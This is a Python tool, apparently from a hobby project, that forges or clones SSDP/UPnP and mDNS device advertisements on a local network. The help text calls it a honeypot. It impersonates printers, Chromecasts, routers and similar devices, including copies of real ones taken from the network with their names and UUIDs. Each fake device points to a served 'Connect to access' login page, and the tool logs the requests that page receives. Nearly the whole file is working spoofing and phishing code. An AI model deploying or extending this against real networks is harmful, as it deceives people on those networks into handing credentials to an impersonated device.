# Checks for the correct import of all of the required packages, if any is missing or returns an error.
# the user get a message and the program exits.
try:
    import socket, sys, getopt, requests, re, os, random, http.server, socketserver, uuid, signal, struct, logging
    from multiprocessing import Process
    from email.utils import formatdate
    from zeroconf import ServiceInfo, Zeroconf, IPVersion
    from time import sleep
except ImportError as text:
    print('There has been and error while importing the required packages:\n')
    print('Error: '+str(text))
    exit()

# Check the version of Python installed, if it is not 3.0+ the user get a message and the program exits.
if sys.version_info < (3, 0):
    print("You need a version of Python 3.0+\n")
    exit()

#Creates a list with all the available arguments for the program
full_cmd_arguments = sys.argv
argument_list = full_cmd_arguments[1:]
short_options = "hgscl"
long_options = ["help","genxml","server","clone","list"]

# Method to get the local ip address of the machine (the one that starts as 192.168.X.X)
local_ip = [l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0]
domain = "none.local" # global variable 

def gen_socket(self):
    """
        Creates a socket and sets it to the local network. This allows the server and the clone function to
        work.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_address = ('', 1900)
    sock.bind(server_address)
    group = socket.inet_aton('239.255.255.250')
    mreq = struct.pack('4s4s', group, socket.inet_aton(local_ip))
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
    return(sock)

class clone:
    """
    Allows the clonation of a local device to spoof it by scanning all of the active services in the local
    network and cloning its properties.
    """
    # This is the query needed to multicast and ask for all the available services.
    REQUEST =  (
        'M-SEARCH * HTTP/1.1'
        '\r\nHOST: 239.255.255.250:1900'
        '\r\nMAN: \"ssdp:discover\"\r\n'
        'MX: 2\r\n'
        'ST: ssdp:all\r\n\r\n')
    def __init__(self):
        # Initialize Socket and bind it to address of the machine.
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # Send the REQUEST to the Broadcast IP and waits 5 seconds for a response of the active services.
        sock.sendto(clone.REQUEST.encode(), ('239.255.255.250',1900))
        sock.settimeout(5)

        UUID_list = []
        os.system('rm -rf ./tmp')
        os.system('mkdir ./tmp')
        counterA = 0
        counterB = 0
        while True:
            try:
                # Start listening to responses from the M-SEARCH query
                data, _ = sock.recvfrom(1024)
                # With the response from all of the ssdp services that have sent a response within the timeout
                incName = data.decode()
                # Searching for the UUID 
                try:
                    uuid = re.search("USN: (.*?)::",incName).group(1)
                except (AttributeError):
                    pass
                # Checks that the UUID is not duplicated, deleting all of the services that are not needed.
                if uuid not in UUID_list:
                    counterB += 1
                    UUID_list.append(uuid)
                    try:
                        location = re.search("LOCATION: (.*?).xml",incName).group(1) + ".xml"
                    except (AttributeError):
                        pass
                    UUID_list.append(location)
                    # Saves the located service xml to parse it more easily.
                    response = requests.get(location)
                    with open('./tmp/ssdp.xml', 'wb') as file:
                        file.write(response.content)
                    # Gets all the info needed from the saved xml and prints it to the user.
                    friendlyname = utils.get_friendlyname_tmp(None)
                    UUID_list.append(friendlyname)
                    service = utils.get_service_tmp(None)
                    UUID_list.append(service)
                    print('--------------------\nService ('+str(counterB)+')')
                    print('Name: '+UUID_list[counterA+2])
                    counterA += 1
                    print('Address: '+UUID_list[counterA])
                    counterA += 1
                    print('UUID: '+UUID_list[counterA-2])
                    counterA += 1
                    print('Service Identificator: '+UUID_list[counterA])
                    TOS = "Unknow"
                    if UUID_list[counterA] == "urn:dial-multiscreen-org:service:dial:1":
                        TOS = "DLNA/Chromecast"
                    elif UUID_list[counterA] == "urn:schemas-upnp-org:service:RenderingControl:1":
                        TOS = "DLNA Receiver"
                    elif UUID_list[counterA] == "urn:schemas-upnp-org:service:PrintBasic:1":
                        TOS = "Printer"
                    print('Service provided: '+TOS+'\n--------------------\n')
                    counterA += 1
                               
            except socket.timeout:
                # Deletes all the temporary files created while parsing the xml
                os.system('rm -rf ./tmp')
                # Ask for the user which service wants and with an algorithm extracts the info of the
                # choosen service.
                print("\nWhich service you want to clone?\n")
                service = input("Write the number of the service: ")
                service = utils.get_service_number(None, service)
                os.system('clear')
                print(
                    'You have selected:\n'
                    'Name: '+UUID_list[service-1]+'\n'
                    'Address: '+UUID_list[service-2]+'\n'
                    'UUID: '+UUID_list[service-3]+'\n'
                    'Service Identificator:'+UUID_list[service]+'\n'
                )
                save = requests.get(UUID_list[service-2])
                print("\nsaving configuration....\n")
                sleep(2)
                with open('./ssdp.xml', 'wb') as file:
                    file.write(save.content)
                os.system('clear')
                genxml.gencloned(None)
              
class genxml:
    """
    Generates a configuration by three different ways:\n
    \n
    Automatic: Generates the XML with a predefined values that are selected randomly.\n
    Custom: The user is asked for every needed value and an XML is generated from the choosen options.\n
    Cloned generation: A option not available to the user because is the one that the function clone 
    uses to save the properties that it got when the user selected a device to clone.\n
    """
    def __init__(self):
        # Ask the user for an input making him to choose betwenn different options.
        os.system('clear')
        print(
            'How you want to generate the .xml:\n\n'
            '\t1) Auto\n'
            '\t2) Custom\n'
            '\tX) Exit\n'
        )
        uinput = input("Selection: ")
        if uinput == "X" or uinput == "x":
            BYE()
        elif uinput == "1":
            self.auto()
        elif uinput == "2":
            self.custom()
    
    def auto(self):
        # Lists with all the curated names, manufacurers and models.
        LIST_FRIENDLYNAMES = ["Zeus","Hera","Apollo","Odin","Ra","Achilles","Agni","Amaterasu","Anhur",
        "Anubis", "Ao Kuang", "Discordia","Fafnir","Ratatoskr"]
        LIST_MANUFACTURERS = ["Microsoft", "Epson", "Synology", "Western Digital", "QNAP", "HP","Canon",
         "Brother"]
        LIST_MODELS = ["One Drive","Shared Office Documents","Chromecast Audio", 
        "Selphy CP1300", "i-Sensys MF643Cdw", "Brother MFCJ5330DW", "NAS WDBNFA0000NBK", "HP 6220",
        "HP 7830", "TS-431P"]
        LIST_SERVICES = ["1","2"]
        LIST_DOMAIN = ["epson.local","google.local","microsoft.local","webpage.local","sonos.local",
        "amazon.local","apple.local","pokemon.local","beats.local"]
        # Selet randomly a entry from every list and generates a unique random uuid.
        RND_FRIENDLYNAME = random.choice(LIST_FRIENDLYNAMES)
        RND_MANUFACTURER = random.choice(LIST_MANUFACTURERS)
        RND_MODEL = random.choice(LIST_MODELS)
        RND_SERVICE = random.choice(LIST_SERVICES)
        RND_UUID = str(uuid.uuid4())
        domain = random.choice(LIST_DOMAIN)

        if RND_SERVICE == "1":
            urn1 = "urn:schemas-upnp-org:device:Basic:1"
            urn2 = "urn:schemas-upnp-org:device:Basic:1"
            urn3 = "urn:schemas-upnp-org:device:Basic"
        elif RND_SERVICE == "2":
            urn1 = "urn:schemas-upnp-org:device:Printer:1"
            urn2 = "urn:schemas-upnp-org:service:PrintBasic:1"
            urn3 = "urn:upnp-org:serviceId:1"
        elif RND_SERVICE == "3":
            urn1 = "urn:dial-multiscreen-org:service:dial:1"
            urn2 = "urn:dial-multiscreen-org:service:dial:1"
            urn3 = "urn:dial-multiscreen-org:service:dial"
        elif RND_SERVICE == "4":
            urn1 = "urn:schemas-upnp-org:device:MediaRenderer:1"
            urn2 = "urn:schemas-upnp-org:device:MediaRenderer:1"
            urn3 = "urn:schemas-upnp-org:device:MediaRenderer"
        elif RND_SERVICE == "5":
            urn1 = "urn:schemas-upnp-org:device:MediaServer:1"
            urn2 = "urn:schemas-upnp-org:device:MediaServer:1"
            urn3 = "urn:schemas-upnp-org:device:MediaServer"
        elif RND_SERVICE == "6":
            urn1 = "urn:schemas-upnp-org:device:ZonePlayer:1"
            urn2 = "urn:schemas-upnp-org:device:ZonePlayer:1"
            urn3 = "urn:schemas-upnp-org:device:ZonePlayer"
        elif RND_SERVICE == "7":
            urn1 = "urn:schemas-sony-com:service:ScalarWebAPI:1"
            urn2 = "urn:schemas-sony-com:service:ScalarWebAPI:1"
            urn3 = "urn:schemas-sony-com:service:ScalarWebAPI"
        elif RND_SERVICE == "8":
            urn1 = "urn:schemas-upnp-org:device:InternetGatewayDevice:1"
            urn2 = "urn:schemas-upnp-org:device:InternetGatewayDevice:1"
            urn3 = "urn:schemas-upnp-org:device:InternetGatewayDevice"
        os.system('clear')
        print("Generating device, please wait a second:\n")
        sleep(2)

        xml = (
            '<?xml version="1.0"?>\r\n'
            '<root xmlns="urn:schemas-upnp-org:device-1-0">\r\n'
                '\t<specVersion>\r\n'
                    '\t\t<major>1</major>\r\n'
                    '\t\t<minor>0</minor>\r\n'
                '\t</specVersion>\r\n'
                '\t<URLBase>http://'+domain+':8008</URLBase>\r\n'
                '\t<device>\r\n'
                    '\t\t<presentationURL>http://'+domain+':8008/login/login.html</presentationURL>\r\n'
                    '\t\t<deviceType>'+urn1+'</deviceType>\r\n'
                    '\t\t<friendlyName>'+RND_FRIENDLYNAME+'</friendlyName>\r\n'
                    '\t\t<modelDescription>Connect to access</modelDescription>\r\n'
                    '\t\t<manufacturer>'+RND_MANUFACTURER+'</manufacturer>\r\n'
                    '\t\t<modelName>'+RND_MODEL+'</modelName>\r\n'
                    '\t\t<UDN>'+RND_UUID+'</UDN>\r\n'
                    '\t\t<serviceList>\r\n'
                        '\t\t\t<service>\r\n'
                            '\t\t\t\t<serviceType>'+urn2+'</serviceType>\r\n'
                            '\t\t\t\t<serviceId>'+urn3+'</serviceId>\r\n'
                            '\t\t\t\t<controlURL>/ssdp/notfound</controlURL>\r\n'
                            '\t\t\t\t<eventSubURL>/ssdp/notfound</eventSubURL>\r\n'
                            '\t\t\t\t<SCPDURL>/ssdp/notfound</SCPDURL>\r\n'
                        '\t\t\t</service>\r\n'
                    '\t\t</serviceList>\r\n'
                '\t</device>\r\n'
            '</root>')

        tfile = open('ssdp.xml', 'w+')
        tfile.write(xml)
        tfile.close()
        os.system('clear')
        print('You want to start the server now or exit?')
        choose = input("\n1) Start the server or 2) Exit: ")
        os.system('clear')
        if choose == "1":
            server()
        elif choose == "2":
            BYE()

    def custom(self):
        # DEVICE TYPE
        os.system('clear')
        print(
            'Which device you want to create?\n\n'
            '\tA) Standard Service\n'
            '\tB) Printer\n'
            '\tC) Chromecast\n'
            '\tD) DLNA Receiver\n'
            '\tE) DLNA Server\n'
            '\tF) Sonos Speaker\n'
            '\tG) Sony Receiver (TV/PS4/PSVita)\n'
            '\tH) Router/Gateway/Switch\n'
        )
        urn1 = "urn:schemas-upnp-org:device:Basic:1"
        urn2 = "urn:schemas-upnp-org:device:Basic:1"
        urn3 = "urn:schemas-upnp-org:device:Basic"
        device = input("Selection: ")
        if device == "B":
            urn1 = "urn:schemas-upnp-org:device:Printer:1"
            urn2 = "urn:schemas-upnp-org:service:PrintBasic:1"
            urn3 = "urn:upnp-org:serviceId:1"
        elif device == "C":
            urn1 = "urn:dial-multiscreen-org:service:dial:1"
            urn2 = "urn:dial-multiscreen-org:service:dial:1"
            urn3 = "urn:dial-multiscreen-org:service:dial"
        elif device == "D":
            urn1 = "urn:schemas-upnp-org:device:MediaRenderer:1"
            urn2 = "urn:schemas-upnp-org:device:MediaRenderer:1"
            urn3 = "urn:schemas-upnp-org:device:MediaRenderer"
        elif device == "E":
            urn1 = "urn:schemas-upnp-org:device:MediaServer:1"
            urn2 = "urn:schemas-upnp-org:device:MediaServer:1"
            urn3 = "urn:schemas-upnp-org:device:MediaServer"
        elif device == "F":
            urn1 = "urn:schemas-upnp-org:device:ZonePlayer:1"
            urn2 = "urn:schemas-upnp-org:device:ZonePlayer:1"
            urn3 = "urn:schemas-upnp-org:device:ZonePlayer"
        elif device == "G":
            urn1 = "urn:schemas-sony-com:service:ScalarWebAPI:1"
            urn2 = "urn:schemas-sony-com:service:ScalarWebAPI:1"
            urn3 = "urn:schemas-sony-com:service:ScalarWebAPI"
        elif device == "H":
            urn1 = "urn:schemas-upnp-org:device:InternetGatewayDevice:1"
            urn2 = "urn:schemas-upnp-org:device:InternetGatewayDevice:1"
            urn3 = "urn:schemas-upnp-org:device:InternetGatewayDevice"       
        # DEVICE NAME
        os.system('clear')
        print('Which name you want for the device?\n')
        custom_FN = input("\nName: ")
        os.system('clear')
        # DEVICE MANUFACTURER
        print('Which manufacturer you want for the device?\n')
        custom_MF = input("\nManufacturer: ")
        # DEVICE MODEL
        os.system('clear')
        print('Which model you want for the device?\n')
        custom_MD = input("\nModel: ")
        # DEVICE DOMAIN
        os.system('clear')
        print('Which domain you want for the device?\n')
        domain = input("\nDomain '[NAME].local': ")
        # LOGIN ROUTE
        os.system('clear')
        print(
            'Where the webpage is located?\n'
            'folder/./file.ext or file.ext'
        )
        web = input("\nWebpage location: ")
        # DEVICE UUID
        os.system('clear')
        print('You want to create a random UUID or provide your own one:')
        selection = input("\n1) Random or 2) Custom: ")
        os.system('clear')
        if selection == "1":
            UUID = str(uuid.uuid4())
        elif selection == "2":
            UUID = input('Write you UUID, remeber to use this format:\n'
            'XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX\n')

        xml = (
            '<?xml version="1.0"?>\r\n'
            '<root xmlns="urn:schemas-upnp-org:device-1-0">\r\n'
                '\t<specVersion>\r\n'
                    '\t\t<major>1</major>\r\n'
                    '\t\t<minor>0</minor>\r\n'
                '\t</specVersion>\r\n'
                '\t<URLBase>http://'+domain+':8008</URLBase>\r\n'
                '\t<device>\r\n'
                    '\t\t<presentationURL>http://'+domain+':8008/'+web+'</presentationURL>\r\n'
                    '\t\t<deviceType>'+urn1+'</deviceType>\r\n'
                    '\t\t<friendlyName>'+custom_FN+'</friendlyName>\r\n'
                    '\t\t<modelDescription>Connect to access</modelDescription>\r\n'
                    '\t\t<manufacturer>'+custom_MF+'</manufacturer>\r\n'
                    '\t\t<modelName>'+custom_MD+'</modelName>\r\n'
                    '\t\t<UDN>'+UUID+'</UDN>\r\n'
                    '\t\t<serviceList>\r\n'
                        '\t\t\t<service>\r\n'
                            '\t\t\t\t<serviceType>'+urn2+'</serviceType>\r\n'
                            '\t\t\t\t<serviceId>'+urn3+'</serviceId>\r\n'
                            '\t\t\t\t<controlURL>/ssdp/notfound</controlURL>\r\n'
                            '\t\t\t\t<eventSubURL>/ssdp/notfound</eventSubURL>\r\n'
                            '\t\t\t\t<SCPDURL>/ssdp/notfound</SCPDURL>\r\n'
                        '\t\t\t</service>\r\n'
                    '\t\t</serviceList>\r\n'
                '\t</device>\r\n'
            '</root>')

        tfile = open('ssdp.xml', 'w+')
        tfile.write(xml)
        tfile.close()
        # START SERVER DIRECTLY OR EXIT
        os.system('clear')
        print('You want to start the server now or exit?')
        choose = input("\n1) Start the server or 2) Exit: ")
        os.system('clear')
        if choose == "1":
            server()
        elif choose == "2":
            BYE()

    def gencloned(self):
        # DEVICETYPE SERVICE TYPE SERVICE ID
        os.system('clear')
        print('Which domain you want for the device cloned?\n')
        domain_rev = input("\nDomain '[NAME].local': ")
        # LOGIN ROUTE
        os.system('clear')
        print(
            'Where the webpage is located?\n'
            'folder/./file.ext or file.ext'
        )
        web = input("\nWebpage location: ")
        FN = utils.get_friendlyname(None)
        MF = utils.get_manufacturer(None)
        MD = utils.get_model(None)
        UUID = utils.get_uuid(None)
        urn1 = utils.get_device(None)
        urn2 = utils.get_service(None)
        urn3 = utils.get_serviceid(None)
        xml = (
            '<?xml version="1.0"?>\r\n'
            '<root xmlns="urn:schemas-upnp-org:device-1-0">\r\n'
                '\t<specVersion>\r\n'
                    '\t\t<major>1</major>\r\n'
                    '\t\t<minor>0</minor>\r\n'
                '\t</specVersion>\r\n'
                '\t<URLBase>http://'+domain_rev+':8008</URLBase>\r\n'
                '\t<device>\r\n'
                    '\t\t<presentationURL>http://'+domain_rev+':8008/'+web+'</presentationURL>\r\n'
                    '\t\t<deviceType>'+urn1+'</deviceType>\r\n'
                    '\t\t<friendlyName>'+FN+'</friendlyName>\r\n'
                    '\t\t<modelDescription>Connect to access</modelDescription>\r\n'
                    '\t\t<manufacturer>'+MF+'</manufacturer>\r\n'
                    '\t\t<modelName>'+MD+'</modelName>\r\n'
                    '\t\t<UDN>'+UUID+'</UDN>\r\n'
                    '\t\t<serviceList>\r\n'
                        '\t\t\t<service>\r\n'
                            '\t\t\t\t<serviceType>'+urn2+'</serviceType>\r\n'
                            '\t\t\t\t<serviceId>'+urn3+'</serviceId>\r\n'
                            '\t\t\t\t<controlURL>/ssdp/notfound</controlURL>\r\n'
                            '\t\t\t\t<eventSubURL>/ssdp/notfound</eventSubURL>\r\n'
                            '\t\t\t\t<SCPDURL>/ssdp/notfound</SCPDURL>\r\n'
                        '\t\t\t</service>\r\n'
                    '\t\t</serviceList>\r\n'
                '\t</device>\r\n'
            '</root>')
        tfile = open('ssdp.xml', 'w+')
        tfile.write(xml)
        tfile.close()
        os.system('clear')
        print('You want to start the server now or exit?')
        choose = input("\n1) Start the server or 2) Exit: ")
        os.system('clear')
        if choose == "1":
            server()
        elif choose == "2":
            BYE()

class server:
    """
    Initialices the server and starts serving on the local network with the options found in the configuration file.\n
    It will keep serving until a close command is given (ctrl + c), if the user kills the process or this gets 
    an error, the server will keep running in the background, when the user aunch again the rogramm it will 
    automatiaclly detect if the server is still running and will try to kill it and relaunch it.
    """
    def __init__(self):

        os.system('clear')
        domain = utils.get_domain(None)
        web = utils.get_url(None)
        initialize_server = Process(target=server.searcher, args=(None,))
        web_server = Process(target=utils.web_server, args=(None,))
        mdns_server = Process(target=utils.mdns_server, args=(None,domain,))
        os.system('clear')
        print("Starting server....")
        sleep(1)
        try:
            initialize_server.start()
            web_server.start()
            mdns_server.start()
            os.system('clear')
            print(
                'Server Started at: '+local_ip+':1900\n\n'
                '\tService .xml location: http://'+domain+':8008/ssdp.xml\n'
                '\tService name: '+utils.get_friendlyname(None)+'\n'
                '\tService URL: '+web+'\n'
                '\tService Spoofed: '+utils.get_service(None)+'\n'
                '\nServer log:\n'
            )
            signal.pause()
        except (BrokenPipeError, ConnectionResetError):
            pass
        except (KeyboardInterrupt, SystemExit):
            os.system('clear')
            BYE()
            initialize_server.terminate()
            web_server.terminate()
            mdns_server.terminate()
            
    def searcher(self):
        while True:
            data, addr = sock.recvfrom(1024)
            # Every time this gets looped, checks the incomming packages for the M-SEARCH header, 
            # if present it sends the necessary info to a function which answer to the packages.
            received_st = re.findall(r'(?i)\\r\\nST:(.*?)\\r\\n', str(data))
            if 'M-SEARCH' in str(data) and received_st:
                requested_st = received_st[0].strip()
                server.answerer(None, addr, requested_st)

    def answerer(self, addr, st):
        date_format = formatdate(timeval=None, localtime=False, usegmt=True)
        UUID = utils.get_uuid(None)
        ssdp_reply = ('HTTP/1.1 200 OK\r\n'
                      'CACHE-CONTROL: max-age=1800\r\n'
                      'DATE: '+date_format+'\r\n'
                      'EXT:\r\n'
                      'LOCATION: http://'+local_ip+':8008/ssdp.xml\r\n'
                      'OPT: "http://schemas.upnp.org/upnp/1/0/"; ns=01\r\n'
                      '01-NLS: '+UUID+'\r\n'
                      'SERVER: UPnP/1.0\r\n'
                      'ST: '+st+'\r\n'
                      'USN: '+UUID+'::'+st+'\r\n'
                      'BOOTID.UPNP.ORG: 0\r\n'
                      'CONFIGID.UPNP.ORG: 1\r\n'
                      '\r\n\r\n'
                      )
        ssdp_reply = bytes(ssdp_reply, 'utf-8')
        sock.sendto(ssdp_reply, addr)

class show_help:
    """
        Shows the user all the help available and then exits the program.
    """
    def __init__(self):
        os.system('clear')
        print(
            'This program provides all the tools needed to create a honeypod\n'
            'on the local network through the SSDP and mDNS protocol.\n'
            '\n'
            'Options:\n'
            '\n'
            '-h     --help      Provides all the help available.\n'
            '\n'
            '-l     --list      List in the terminal the most common services\n'
            '                   to allow the user know how to spoof it.\n'
            '\n'
            '-g     --genxml    Allows the creation (Automatic or not) of a\n'
            '                   .xml file which will allow to spoof the\n'
            '                   required device.\n'
            '\n'
            '-s     --server    Starts the server with the .xml found, if no\n'
            '                   .xml available the user will be asked to\n'
            '                   create a new one or exit.\n'
            '\n'
            '-c     --clone     Allows the clonation of a local service in\n'
            '                   the local network to spoof it later.\n'
        )

class show_devices:
    """
        Shows all the know devices information.
    """
    def __init__(self):
        os.system('clear')
        print(
            '--------------------\n'
            'Chromecast:\n'
            'urn:dial-multiscreen-org:service:dial:1\n'
            '--------------------\n'
            'DLNA RECEIVER:\n'
            'urn:schemas-upnp-org:device:MediaRenderer:1\n'
            '--------------------\n'
            'DLNA SERVER:\n'
            'urn:schemas-upnp-org:device:MediaServer:1\n'
            '--------------------\n'
            'PRINTER:\n'
            'urn:schemas-upnp-org:device:Printer:1\n'
            '--------------------\n'
            'SONOS SPEAKER:\n'
            'urn:schemas-upnp-org:device:ZonePlayer:1\n'
            '--------------------\n'
            'SONY RECEIVER (TV/PS4/PSVita):\n'
            'urn:schemas-sony-com:service:ScalarWebAPI:1\n'
            '--------------------\n'
            'ROUTER/GATEWAY/SWITCH:\n'
            'urn:schemas-upnp-org:device:InternetGatewayDevice:1\n'
            '--------------------\n'
            'NOT DEFINED DEVICE:\n'
            'urn:schemas-upnp-org:device:Basic:1\n'
            '--------------------'
        )
class logServer(http.server.SimpleHTTPRequestHandler):
    """
        This class logs all of the GET and POST received from the webpage and shows it on the terminal,
        allowing to the user to log all of the interactions.
    """
    def log_message(self, format, *args):
        print("\n\t%s -> [%s] -> %s\n" %
                         (self.address_string(),
                          self.log_date_time_string(),
                          format%args))

class utils:
    """
        A collection of different functions and utilities that helps to organize the program.
    """
    def web_server(self):
        """
            The function that allows to server all the webpages and other files through http.
        """
        try:
            with socketserver.TCPServer(("", 8008), logServer) as httpd:
                httpd.allow_reuse_address = True
                httpd.serve_forever()
        except OSError:
            # When the server is closed badly (ctrl+Z or y errors) the port gets blocked, this error handling
            # tries to recover from that klling the blocked process and restarting the server.
            os.system('clear')
            print(
            'Seems that the server is still running in the background and the programm can´t\n'
            'continue, you will be asked for your sudo password to terminate the server and\n'
            'try again.\n\n'
            )
            os.system('sudo lsof -t -i tcp:8008 | xargs kill -9')
            sleep(1)
            os.system('sudo lsof -t -i tcp:8008 | xargs kill -9')
            server()      
    def mdns_server(self, domain_mdns):
        """
            Generates a mDNS server which provides the local network with a Name Service.
        """
        desc = {'path': '/'}
        info = ServiceInfo(
            "_http._tcp.local.",
            "_http._tcp.local.",
            addresses=[socket.inet_aton(local_ip)],
            port=8008,
            properties=desc,
            server=domain_mdns+'.',
        )

        zeroconf = Zeroconf(ip_version=IPVersion.V4Only)
        zeroconf.register_service(info)
        try:
            while True:
                sleep(0.1)
        except KeyboardInterrupt:
            pass
        finally:
            zeroconf.unregister_service(info)
            zeroconf.close()
    def get_friendlyname(self):
        data = open('./ssdp.xml').read()
        try:
            friendlyname = re.search("<friendlyName>(.*?)</friendlyName>",data).group(1)
        except (AttributeError):
            print("FriendlyName not found.")
        return(friendlyname)
    def get_manufacturer(self):
        data = open('./ssdp.xml').read()
        try:
            manufacturer = re.search("<manufacturer>(.*?)</manufacturer>",data).group(1)
        except (AttributeError):
            print("Manufacturer not found.")
        return(manufacturer)
    def get_model(self):
        data = open('./ssdp.xml').read()
        try:
            model = re.search("<modelName>(.*?)</modelName>",data).group(1)
        except (AttributeError):
            print("Model not found.")
        return(model)
    def get_url(self):
        data = open('./ssdp.xml').read()
        try:
            url = re.search("<presentationURL>(.*?)</presentationURL>",data).group(1)
        except (AttributeError):
            url = "http://"+local_ip+"/pages/login.html"
        return(url)
    def get_device(self):
        data = open('./ssdp.xml').read()
        try:
            device = re.search("<deviceType>(.*?)</deviceType>",data).group(1)
        except (AttributeError):
            print("Device type not found.")
        return(device)
    def get_service(self):
        data = open('./ssdp.xml').read()
        try:
            service = re.search("<serviceType>(.*?)</serviceType>",data).group(1)
        except (AttributeError):
            print("Service type not found.")
        return(service)
    def get_serviceid(self):
        data = open('./ssdp.xml').read()
        try:
            serviceid = re.search("<serviceId>(.*?)</serviceId>",data).group(1)
        except (AttributeError):
            print("Device type not found.")
        return(serviceid)
    def get_uuid(self):
        data = open('ssdp.xml').read()
        search = data.find("<UDN>")
        uuid = data[search+5:]
        UUID = uuid[0:36]
        return(UUID)
    def get_friendlyname_tmp(self):
        data = open('./tmp/ssdp.xml').read()
        try:
            friendlyname = re.search("<friendlyName>(.*?)</friendlyName>",data).group(1)
        except (AttributeError):
            print("FriendlyName not found.")
        return(friendlyname)
    def get_service_tmp(self):
        data = open('./tmp/ssdp.xml').read()
        try:
            service = re.search("<serviceType>(.*?)</serviceType>",data).group(1)
        except (AttributeError):
            print("Service type not found.")
        return(service)
    def get_service_number(self, service):
        service = int(service) * 4 - 1
        return(service)
    def get_domain(self):
        data = open('./ssdp.xml').read()
        try:
            domain = re.search("http://(.*?):",data).group(1)
        except (AttributeError):
            domain = ""
        return(domain)

def main():
    """
        The main function of the program if an argument is given it will recognize it and execute the proper function.\n

        If no argument is provided it will show a menu with all the available options to the user.
    """
    arguments = len(sys.argv) - 1

    if arguments == 0:
        os.system('clear')
        print('What you want to do?\n'
        '\n1) Generate XML // 2) Start server // 3) Clone // 4) Help // 5) List devices options // 6) Exit\n')
        choose = input("Selection: ")
        os.system('clear')
        if choose == "1":
            genxml()
        elif choose == "2":
            server()
        elif choose == "3":
            clone()
        elif choose == "4":
            show_help()
        elif choose == "5":
            show_devices()
        else:
            BYE()
    else:
        try:
            # Checks the arguments provided to see if are valid.
            arguments, _ = getopt.getopt(argument_list, short_options, long_options)
        except getopt.error:
            exit()
        
        # Loop through the arguments checking for matches if the argument received is not 
        # listed it will return an eror and exit the program
        for current_argument, _ in arguments:
            if current_argument in ("-h", "--help"):
                show_help()
            if current_argument in ("-g", "--genxml"):
                genxml()
            if current_argument in ("-s", "--server"):
                server()
            if current_argument in ("-c", "--clone"):
                clone()
            if current_argument in ("-l", "--list"):
                show_devices()

def BYE():
    """
        This function is executed when the user wants to leave the server.
    """
    os.system('clear')
    print("BYE")
    sleep(2)
    os.system('clear')
    exit()

if __name__ == "__main__":
    try:
        sock = gen_socket(None)
        main()
    except KeyboardInterrupt:
        BYE()